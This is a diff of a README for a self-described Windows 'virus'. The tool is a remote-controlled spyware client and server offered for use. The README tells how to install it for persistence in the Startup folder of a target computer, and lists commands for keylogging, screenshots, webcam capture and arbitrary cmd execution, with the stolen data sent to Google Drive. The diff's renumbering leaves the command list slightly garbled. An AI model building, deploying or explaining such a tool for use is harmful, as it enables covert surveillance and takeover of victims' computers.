@@ -1,18 +1,18 @@
 A virus for Windows written in C with a server that manages the clients.
 
-A shortcut to the executable file is intended to be install on a target computer in folder "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" for it to be ran automatically on startup (inside the folder to which the shortcut leads, the escapi.dll file should be places as well). The malware includes options to take screenshots and webcam shots (if a webcam is present and not in use), log keyboard, and execute commands in cmd. The clients are controlled by a server that serves them commands upon request (by default - one minute delay between requests) and saves the pictures and logfiles on Google Drive.
+A shortcut to the executable file is intended to be install on a target computer in folder `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` for it to be ran automatically on startup (inside the folder to which the shortcut leads, the escapi.dll file should be places as well). The malware includes options to take screenshots and webcam shots (if a webcam is present and not in use), log keyboard, and execute commands in cmd. The clients are controlled by a server that serves them commands upon request (by default - one minute delay between requests) and saves the pictures and logfiles on Google Drive.
 
 The server and client communicate via HTTP requests and responses.
 
 Possible commands are:
-start_keylogging - starts to log keyboard and saves it to a file locally.
-send_keylogging - sends the logged data to the server which saves it to Google Drive.
-stop_keylogging - stops to log keyboard.
-take_webcam_capture - if webcam is present and not in use, takes picture from webcam and sends it to the server which saves it to Google Drive. Otherwise, does nothing.
-take_screenshot - takes screenshot and sends it to the server which saves it to Google Drive.
-execute `command` - executes `command` in cmd.
-stop_execution - stops the program execution.
-no_commands - does nothing (used in case the server wants to tell a client that it has no commands for the moment).
+1. `start_keylogging` - starts to log keyboard and saves it to a file locally.
+2. `send_keylogging` - sends the logged data to the server which saves it to Google Drive.
+3. `stop_keylogging` - stops to log keyboard.
+4. `take_webcam_capture` - if webcam is present and not in use, takes picture from webcam and sends it to the server which 5. saves it to Google Drive. Otherwise, does nothing.
+6. `take_screenshot` - takes screenshot and sends it to the server which saves it to Google Drive.
+7. `execute <command>` - executes `<command>` in cmd.
+8. `stop_execution` - stops the program execution.
+9. `no_commands` - does nothing (used in case the server wants to tell a client that it has no commands for the moment).
 
 For the data received from clients to be saved in Google Drive, one would have to enable the Drive API and fill in the credentials in file credentials.json (`Enable the Drive API` button in: https://developers.google.com/drive/api/v3/quickstart/python#step_1_turn_on_the , choose project name, desktop app, download credentials).
 One might choose to erase file credentials.json, and then a link would be opened in one's browser in which one would need to sign into their gmail account.
